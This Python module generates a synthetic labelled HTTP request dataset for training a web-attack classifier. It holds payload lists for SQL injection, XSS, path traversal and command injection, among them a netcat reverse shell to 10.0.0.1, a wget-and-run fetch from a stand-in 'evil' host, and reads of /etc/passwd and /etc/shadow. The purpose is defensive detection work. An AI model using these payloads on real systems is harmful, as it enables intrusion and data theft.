"""合成 HTTP 请求数据集（可行性验证用）。

注意：本模块生成的是**合成数据**，用于验证工程链路（特征->训练->ONNX导出->CPU推理）
与延迟指标，**不能**用于宣称真实检测率。真实评估需 CSIC 2010 / HTTP Params 2015
及生产脱敏流量（见 PRD 5.1）。

label: 0=normal 1=sqli 2=xss 3=cmdi 4=traversal
"""
from __future__ import annotations

import random
import string
from typing import Dict, List, Tuple

LABELS = {0: "normal", 1: "sqli", 2: "xss", 3: "cmdi", 4: "traversal"}

_WORDS = ["users", "orders", "products", "search", "login", "profile", "items",
          "reviews", "cart", "checkout", "session", "ping", "download", "file",
          "comment", "post", "image", "avatar", "report", "export"]


def _rand_id(rng: random.Random) -> str:
    return str(rng.randint(1, 999999))


def _rand_name(rng: random.Random, n: int = 6) -> str:
    return "".join(rng.choice(string.ascii_lowercase) for _ in range(n))


def _rand_token(rng: random.Random, n: int = 24) -> str:
    return "".join(rng.choice(string.ascii_letters + string.digits) for _ in range(n))


def _req(method, path, query="", body="", headers=None) -> Dict[str, str]:
    return {"method": method, "path": path, "query": query,
            "body": body, "headers": headers or {}}


# --------------------------------------------------------------------------
# 正常流量（含大量"硬负样本"：合法含特殊字符，用于评估误报）
# --------------------------------------------------------------------------
def _normal(rng: random.Random) -> Dict[str, str]:
    w = rng.choice(_WORDS)
    kind = rng.randint(0, 9)
    if kind == 0:
        return _req("GET", f"/api/v1/{w}", f"page={rng.randint(1,50)}&limit={rng.choice([10,20,50])}")
    if kind == 1:
        return _req("GET", f"/api/v1/{w}/{_rand_id(rng)}")
    if kind == 2:
        return _req("POST", "/api/v1/login",
                    body=f'{{"username":"{_rand_name(rng)}","password":"{_rand_token(rng,12)}"}}')
    if kind == 3:  # 合法搜索含空格/加号
        return _req("GET", "/search", f"q={rng.choice(['hello world','c++ tutorial','1+1=2','a&b'])}&sort=price")
    if kind == 4:  # 合法 JSON 带花括号/引号
        return _req("POST", "/api/v1/comment",
                    body=f'{{"text":"Nice product, thanks!","rating":{rng.randint(1,5)}}}')
    if kind == 5:  # 邮箱 / @ 符号
        return _req("GET", "/api/v1/user", f"email={_rand_name(rng)}@example.com")
    if kind == 6:  # base64 token
        return _req("GET", "/api/v1/profile", f"token={_rand_token(rng,32)}")
    if kind == 7:  # 含百分号的合法参数（URL 编码空格）
        return _req("GET", "/search", f"q={rng.choice(['new%20york','red%20shoes'])}")
    if kind == 8:  # 文件下载合法路径
        return _req("GET", "/download", f"file={w}_{_rand_id(rng)}.pdf")
    return _req("GET", f"/api/v1/{w}/{_rand_id(rng)}/detail", f"lang={rng.choice(['en','zh','ja'])}")


# --------------------------------------------------------------------------
# 攻击流量
# --------------------------------------------------------------------------
_SQLI = [
    "1' OR '1'='1", "1' OR 1=1--", "admin'--", "' OR 'x'='x",
    "1 UNION SELECT username,password FROM users--",
    "1 UNION ALL SELECT NULL,NULL,NULL--", "1; DROP TABLE users;--",
    "1' AND SLEEP(5)--", "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    "1' OR '1'='1' /*", "1' AND 1=CONVERT(int,@@version)--",
    "-1' UNION SELECT 1,2,3--", "1) OR (1=1)--", "' OR ''='",
    "1'; EXEC xp_cmdshell('whoami')--",
]

_XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.cookie)>", "javascript:alert(1)",
    "\"><script>alert('xss')</script>", "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>", "'-alert(1)-'", "<img src=\"x\" onerror=prompt(1)>",
    "<ScRiPt>alert(1)</ScRiPt>", "%3Cscript%3Ealert(1)%3C/script%3E",
]

_CMDI = [
    "127.0.0.1; cat /etc/passwd", "127.0.0.1 | whoami", "`id`",
    "$(whoami)", "127.0.0.1 && dir", "127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
    "127.0.0.1 & ping -n 10 127.0.0.1", "| powershell -c whoami",
    "; wget http://evil/x.sh -O /tmp/x; sh /tmp/x", "127.0.0.1;chmod 777 /etc/passwd",
]

_TRAV = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
    "..%2f..%2f..%2fboot.ini", "..\\..\\..\\..\\boot.ini",
    "/download?file=../../../../etc/shadow", "..%5c..%5cwindows%5cwin.ini",
]


def _sqli(rng): 
    return _req(rng.choice(["GET", "POST"]), rng.choice(["/login", "/search", "/api/v1/user"]),
                query=f"id={rng.choice(_SQLI)}",
                body=(f'{{"username":"{rng.choice(_SQLI)}"}}' if rng.random() < 0.3 else ""))


def _xss(rng):
    return _req(rng.choice(["GET", "POST"]), rng.choice(["/comment", "/search", "/api/v1/post"]),
                query=f"msg={rng.choice(_XSS)}",
                body=(f'{{"text":"{rng.choice(_XSS)}"}}' if rng.random() < 0.3 else ""))


def _cmdi(rng):
    return _req("GET", rng.choice(["/ping", "/api/v1/exec", "/tools/dns"]),
                query=f"host={rng.choice(_CMDI)}")


def _trav(rng):
    return _req("GET", rng.choice(["/download", "/api/v1/file", "/static"]),
                query=f"file={rng.choice(_TRAV)}")


_GEN = {0: _normal, 1: _sqli, 2: _xss, 3: _cmdi, 4: _trav}


def generate(n_per_class: int = 2000, seed: int = 20261015) -> Tuple[List[Dict[str, str]], List[int]]:
    rng = random.Random(seed)
    reqs, labels = [], []
    for label, fn in _GEN.items():
        for _ in range(n_per_class):
            reqs.append(fn(rng))
            labels.append(label)
    idx = list(range(len(reqs)))
    rng.shuffle(idx)
    return [reqs[i] for i in idx], [labels[i] for i in idx]


def split(reqs, labels, test_ratio=0.3, seed=7):
    rng = random.Random(seed)
    idx = list(range(len(reqs)))
    rng.shuffle(idx)
    cut = int(len(idx) * (1 - test_ratio))
    tr = idx[:cut]
    te = idx[cut:]
    return ([reqs[i] for i in tr], [labels[i] for i in tr],
            [reqs[i] for i in te], [labels[i] for i in te])


if __name__ == "__main__":
    from collections import Counter
    r, l = generate(200)
    print("total:", len(r), Counter(l))
    for i in range(3):
        print(LABELS[l[i]], r[i])
